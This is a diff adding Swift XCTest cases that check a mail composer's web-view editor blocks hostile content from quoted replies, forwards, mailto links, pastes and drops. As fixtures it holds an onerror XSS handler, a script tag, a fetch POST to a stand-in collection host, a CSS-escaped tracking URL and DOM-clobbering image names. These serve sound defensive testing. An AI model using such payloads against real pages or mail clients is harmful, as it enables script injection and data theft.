@@ -1,5 +1,6 @@
 import XCTest
 @testable import CabalmailKit
+import CabalmailKitTestSupport
 
 /// Conversion-rule tests. The Apple-side composer must produce the same wire
 /// HTML / Markdown bytes as the React composer, so the rules baked into
@@ -306,5 +307,257 @@ extension RichTextEditorControllerTests {
             XCTFail("\(method) threw \(error), not a CallFailure", file: file, line: line)
         }
         return nil
+    }
+}
+
+// MARK: - Content from outside the editor
+
+/// The editor page runs script for itself, so markup that arrives with a
+/// message must not bring any along. Reply, forward and mailto seed the
+/// editor from text somebody else wrote, and marked passes raw HTML through.
+/// Each probe here names `window.__cabalProbe`; nothing may set it.
+/// Same file as the suite for its booted controller and its CI carve-out.
+extension RichTextEditorControllerTests {
+    private static let handler = #"<img src="cabal-probe.png" onerror="window.__cabalProbe = 'ran'">"#
+
+    func testReplySeedRunsNothingFromTheQuotedText() async throws {
+        let envelope = Envelope(
+            uid: 1,
+            messageId: nil,
+            subject: "Hello",
+            from: [EmailAddress(name: "Sender", mailbox: "sender", host: "example.com")],
+            flags: []
+        )
+        let body = "Hi there.\n\n\(Self.handler)\n\n> \(Self.handler)"
+        let draft = ReplyBuilder.build(from: envelope, body: body, mode: .reply, userAddresses: [])
+
+        try await assertSeedRunsNothing(draft.body)
+    }
+
+    func testForwardHeaderRunsNothingFromTheSendersNameOrSubject() async throws {
+        let envelope = Envelope(
+            uid: 1,
+            messageId: nil,
+            subject: "Subject \(Self.handler)",
+            from: [EmailAddress(name: "Name \(Self.handler)", mailbox: "sender", host: "example.com")],
+            flags: []
+        )
+        let draft = ReplyBuilder.build(from: envelope, body: "Body", mode: .forward, userAddresses: [])
+        XCTAssertTrue(draft.body.contains("onerror"), "the fixture must carry the handler into the seed")
+
+        try await assertSeedRunsNothing(draft.body)
+    }
+
+    func testMailtoBodyRunsNothing() async throws {
+        let body = try XCTUnwrap("Hello \(Self.handler)".addingPercentEncoding(withAllowedCharacters: .alphanumerics))
+        let url = try XCTUnwrap(URL(string: "mailto:someone@example.com?body=\(body)"))
+        let draft = try XCTUnwrap(MailtoURL(url)).draft()
+        XCTAssertTrue(draft.body.contains("onerror"), "the fixture must carry the handler into the seed")
+
+        try await assertSeedRunsNothing(draft.body)
+    }
+
+    /// The second lock: markup that reaches the page without going through
+    /// `setHTML` still runs no inline handler, because the page's content
+    /// security policy refuses it.
+    func testPageRefusesAnInlineHandlerThatSkipsTheSanitizer() async throws {
+        try await watchPolicyViolations()
+        _ = try await controller.webView.evaluateJavaScript(
+            "document.getElementById('editor').insertAdjacentHTML('beforeend', \(jsonString(Self.handler))); true"
+        )
+
+        let ran = try await probeAfterImagesSettle()
+        XCTAssertEqual(ran, "", "an inline handler ran in the composer")
+        // Fails here if the page never reports a script-src violation.
+        try await waitUntilOnMainActor { try await self.violations().contains { $0.hasPrefix("script-src") } }
+    }
+
+    func testPageCannotSendRequests() async throws {
+        try await watchPolicyViolations()
+        _ = try await controller.webView.evaluateJavaScript(
+            "fetch('https://example.invalid/collect', { method: 'POST', body: 'x' }).catch(function () {}); true"
+        )
+
+        // Fails here if the page never reports a connect-src violation.
+        try await waitUntilOnMainActor { try await self.violations().contains("connect-src") }
+    }
+
+    func testReplySeedShowsRemoteImagesAsText() async throws {
+        let markdown = "![logo](https://tracker.invalid/logo.png)\n\n<img src=\"https://tracker.invalid/p.gif\">"
+            + "\n\n![part](cid:part1)"
+        let html = await controller.markdownToHtml(markdown)
+
+        await controller.setHTML(html, blockingRemoteImages: true)
+        let blocked = await controller.getHTML()
+        XCTAssertFalse(blocked.contains("tracker.invalid/logo.png\""), blocked)
+        XCTAssertFalse(blocked.contains("<img src=\"https"), blocked)
+        XCTAssertTrue(blocked.contains("logo"), blocked)
+        XCTAssertTrue(blocked.contains("https://tracker.invalid/p.gif"), "an image with no alt text shows its address")
+        XCTAssertTrue(blocked.contains("<img src=\"cid:part1\""), "a cid: part is not remote: \(blocked)")
+
+        // A paste or a reopened draft keeps its images.
+        await controller.setHTML(html)
+        let kept = await controller.getHTML()
+        XCTAssertTrue(kept.contains("<img src=\"https://tracker.invalid/logo.png\""), kept)
+    }
+
+    /// Blocking drops inline style outright: a CSS escape spells `url(`
+    /// without the attribute's text containing it.
+    func testReplySeedDropsInlineStyle() async throws {
+        let escaped = #"<p><span style="background:u\rl(https://tracker.invalid/e.png)">s</span></p>"#
+        await controller.setHTML(escaped, blockingRemoteImages: true)
+        let html = await controller.getHTML()
+        XCTAssertEqual(html, "<p><span>s</span></p>")
+    }
+
+    func testReplySeedKeepsTheSignaturesOwnImages() async throws {
+        let signature = "Me\n\n![sig](https://signature.invalid/sig.png)"
+        let seed = SignatureFormatter.seedBody(base: "\n\n> ![t](https://tracker.invalid/t.png)", signature: signature)
+        let html = await controller.markdownToHtml(seed)
+
+        await controller.setHTML(html, blockingRemoteImages: true, keepingImagesFrom: signature)
+        let seeded = await controller.getHTML()
+        XCTAssertTrue(seeded.contains("<img src=\"https://signature.invalid/sig.png\""), seeded)
+        XCTAssertFalse(seeded.contains("<img src=\"https://tracker.invalid"), seeded)
+    }
+
+    func testPastedHtmlLosesItsHandlersAndKeepsItsFormatting() async throws {
+        let pasted = "<p><b>bold</b> and <i>italic</i>\(Self.handler)</p>"
+            + "<script>window.__cabalProbe = 'script'</script>"
+        let html = try await deliver("paste", html: pasted)
+        XCTAssertTrue(html.contains("<b>bold</b>"), html)
+        XCTAssertTrue(html.contains("<i>italic</i>"), html)
+        XCTAssertFalse(html.contains("onerror"), html)
+        XCTAssertFalse(html.contains("<script"), html)
+        let ran = try await probeAfterImagesSettle()
+        XCTAssertEqual(ran, "")
+    }
+
+    /// A named image would shadow the document method of that name and
+    /// break the editor. The paragraphs make the paste path flatten them,
+    /// which must not reopen a quoted attribute.
+    func testPasteCannotShadowTheDocumentsMethods() async throws {
+        let pasted = #"<p>a</p><p title="><img name=createElement src=cid:x>">b</p>"#
+            + #"<img name="execCommand" src="cid:y">"#
+        let html = try await deliver("paste", html: pasted)
+        XCTAssertFalse(html.contains("name="), html)
+        let intact = try await controller.webView.evaluateJavaScript(
+            "typeof document.createElement === 'function' && typeof document.execCommand === 'function'"
+        ) as? Bool
+        XCTAssertEqual(intact, true, "a pasted image shadowed a document method")
+    }
+
+    func testDroppedHtmlTakesThePastePath() async throws {
+        let dropped = "<p><b>dropped</b>\(Self.handler)</p><img name=\"execCommand\" src=\"cid:y\">"
+        let html = try await deliver("drop", html: dropped)
+        XCTAssertTrue(html.contains("<b>dropped</b>"), html)
+        XCTAssertFalse(html.contains("onerror"), html)
+        XCTAssertFalse(html.contains("name="), html)
+        let ran = try await probeAfterImagesSettle()
+        XCTAssertEqual(ran, "")
+    }
+
+    /// Script in the page can't navigate it: not to another local file, and
+    /// not back to the editor itself, which would reload it and wipe the
+    /// draft.
+    func testPageCannotNavigateAwayFromTheEditor() async throws {
+        await controller.setHTML("<p>Kept</p>")
+        let other = controller.webView.url?.deletingLastPathComponent()
+            .appendingPathComponent("editor-bridge.js").absoluteString ?? ""
+        for target in ["location.href", jsonString(other)] {
+            _ = try await controller.webView.evaluateJavaScript("location.href = \(target); true")
+            // Nothing to wait *for* when the navigation is refused, so give
+            // a navigation that was allowed time to replace the page.
+            try await Task.sleep(nanoseconds: 1_000_000_000)
+            let read = await controller.getHTML()
+            XCTAssertEqual(read, "<p>Kept</p>", "the page navigated to \(target)")
+            XCTAssertEqual(controller.webView.url?.lastPathComponent, "editor.html")
+        }
+    }
+
+    // MARK: Helpers
+
+    /// Seeds the editor the way `ComposeViewModel` does and checks that
+    /// the handler neither survived nor ran.
+    private func assertSeedRunsNothing(
+        _ markdown: String,
+        file: StaticString = #filePath,
+        line: UInt = #line
+    ) async throws {
+        let html = await controller.markdownToHtml(markdown)
+        XCTAssertTrue(html.contains("onerror"), "marked passes raw HTML through", file: file, line: line)
+
+        await controller.setHTML(html, blockingRemoteImages: true)
+
+        let seeded = await controller.getHTML()
+        XCTAssertFalse(seeded.contains("onerror"), seeded, file: file, line: line)
+        XCTAssertTrue(seeded.contains("<img"), "the image itself stays: \(seeded)", file: file, line: line)
+        let ran = try await probeAfterImagesSettle()
+        XCTAssertEqual(ran, "", "a handler from the seed ran in the composer", file: file, line: line)
+    }
+
+    /// Waits until every image on the page has loaded or failed, by which
+    /// time an inline `onerror` would have run, then reads the probe.
+    private func probeAfterImagesSettle() async throws -> String {
+        try await waitUntilOnMainActor {
+            try await self.controller.webView.evaluateJavaScript(
+                "Array.from(document.images).every(function (img) { return img.complete; })"
+            ) as? Bool == true
+        }
+        try await Task.sleep(nanoseconds: 200_000_000)
+        let value = try await controller.webView.evaluateJavaScript("String(window.__cabalProbe || '')")
+        return value as? String ?? "unreadable"
+    }
+
+    /// Puts the caret at the end of the editor and fires a `paste` or a
+    /// `drop` carrying `html`, as WebKit would, then reads the editor.
+    private func deliver(_ kind: String, html: String) async throws -> String {
+        let read = try await controller.webView.evaluateJavaScript(
+            """
+            (function (kind, html) {
+              const editor = document.getElementById('editor');
+              editor.focus();
+              const range = document.createRange();
+              range.selectNodeContents(editor);
+              range.collapse(false);
+              const selection = window.getSelection();
+              selection.removeAllRanges();
+              selection.addRange(range);
+              const data = new DataTransfer();
+              data.setData('text/html', html);
+              const init = { bubbles: true, cancelable: true };
+              const field = kind === 'paste' ? 'clipboardData' : 'dataTransfer';
+              init[field] = data;
+              const Kind = kind === 'paste' ? ClipboardEvent : (window.DragEvent || MouseEvent);
+              const event = new Kind(kind, init);
+              if (event[field] !== data) Object.defineProperty(event, field, { value: data });
+              editor.dispatchEvent(event);
+              return editor.innerHTML;
+            })(\(jsonString(kind)), \(jsonString(html)))
+            """
+        ) as? String
+        return try XCTUnwrap(read)
+    }
+
+    private func watchPolicyViolations() async throws {
+        _ = try await controller.webView.evaluateJavaScript(
+            """
+            window.__cabalViolations = [];
+            document.addEventListener('securitypolicyviolation', function (event) {
+              window.__cabalViolations.push(String(event.effectiveDirective || event.violatedDirective));
+            });
+            true
+            """
+        )
+    }
+
+    private func violations() async throws -> [String] {
+        let value = try await controller.webView.evaluateJavaScript("window.__cabalViolations.join(' ')")
+        return (value as? String ?? "").split(separator: " ").map(String.init)
+    }
+
+    private func jsonString(_ value: String) -> String {
+        let data = (try? JSONSerialization.data(withJSONObject: [value])) ?? Data()
+        return String(String(data: data, encoding: .utf8)?.dropFirst().dropLast() ?? "\"\"")
     }
 }
